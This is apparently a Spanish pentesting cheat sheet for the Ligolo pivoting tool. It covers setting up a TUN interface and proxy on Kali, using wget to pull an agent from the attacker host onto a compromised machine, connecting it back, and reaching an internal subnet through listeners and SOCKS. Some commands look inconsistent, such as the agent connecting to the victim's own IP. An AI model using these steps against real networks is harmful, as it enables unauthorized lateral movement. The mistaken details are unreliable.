# 🚀 LIG0L0 - Red Pivoting y Túneles TCP/UDP

LIG0L0 es una herramienta de **pivoting de red y túneles TCP/UDP**, que permite redirigir tráfico de máquinas comprometidas hacia la máquina atacante para realizar pruebas de pentesting internas.

---

## **1️⃣ Preparación del entorno**

### Extraer archivos

```bash
tar -xf ligolo.tar.gz
```
## Crear interfaz TUN en Linux
```bash
sudo ip tuntap add user $USER mode tun ligolo

sudo ip link set ligolo up
```

## Configurar red de pivoting
* red_pivoting -> 192.168.1.0/24
```bash
sudo ip route add red_pivoting dev ligolo
```


## 2️⃣ Configuración en Kali Linux (Atacante)
* ip -> 10.0.2.100
* Dar permisos de ejecución al proxy
```bash
chmod +x proxy
```
* Ejecutar el proxy con certificado autofirmado:
```bash
./proxy -selfcert
```
* Puerto usado para la conexión: 11601




## 3️⃣ Configuración en Máquina Pivoting (Victima 1)
* IP de la víctima: 10.0.2.101
* IP interna de red a pivotear: 192.168.1.101


wget http://10.0.2.100/agente

```bash
chmod +x agente

./agente -connect 10.0.2.101:11601  -ignore-cert
```

4️⃣ Operaciones desde Kali

* Iniciar sesión en LIG0L0:

    - session   
    - Enter 
    - start 
* Probar conectividad hacia la red interna:
    - ping -c 1  192.168.1.102  
* Agregar listener para redireccionar tráfico:
    - listener_add --addr 0.0.0.0:4443 --to  127.0.0.1:4443 
    - listener_list

5️⃣ Máquina Victima 2 (Objetivo de Pivoting)  
* IP interna: 192.168.1.102
* Ahora podemos acceder a esta máquina a través de la víctima pivotante usando LIG0L0 y los listeners configurados.

6️⃣ Limpieza / Remoción del Pivoting
* Eliminar ruta de pivoting:

```bash
sudo ip route del red_pivoting dev ligolo
```

* Eliminar interfaz TUN:
```bash
sudo ip link del ligolo
```
---
# MODO Redireccion Todos los Puertos

## 1️⃣ Configuración básica

* En la máquina atacante (Kali):
* Ejecuta el proxy de LIG0L0 con certificado autofirmado:
```bash
chmod +x proxy
./proxy -selfcert
```

## 2️⃣ Redirección de tráfico completo (SOCKS)

* Para que todo el tráfico de la víctima pase a través de Kali, debes configurar LIG0L0 con modo SOCKS y luego usarlo con Proxychains o configurar la ruta:

* En la máquina pivoting, habilita SOCKS:
```bash
./agente -connect 10.0.2.100:11601 -ignore-cert -socks
```

- Nota: el parámetro -socks indica que quieres que el agente cree un proxy SOCKS local en la máquina atacante.

### Configura Proxychains en Kali para usar el SOCKS que creó LIG0L0:
```bash
sudo nano /etc/proxychains4.conf
```

* Agrega o edita la línea:
```bash
socks5 127.0.0.1 1080
```

* 1080 es el puerto del SOCKS que LIG0L0 crea por defecto (ajústalo si usaste otro).

### Prueba redirigiendo tráfico a través del SOCKS:
```bash
proxychains4 curl http://192.168.1.102
```

* Todo el tráfico ahora pasa por el agente LIG0L0 hacia Kali, y luego hacia la red interna.

## 3️⃣ Alternativa: redirección de toda la subred interna

Si quieres que toda la red interna de la víctima pase por Kali:

Configura la ruta en la víctima pivotante:
```bash
sudo ip route add 192.168.1.0/24 dev ligolo
```

* Esto redirige todo el tráfico de la subred 192.168.1.0/24 a través del túnel creado por LIG0L0.

* En Kali, asegúrate de tener el proxy/escucha activo (./proxy -selfcert) y revisa con listener_list que esté funcionando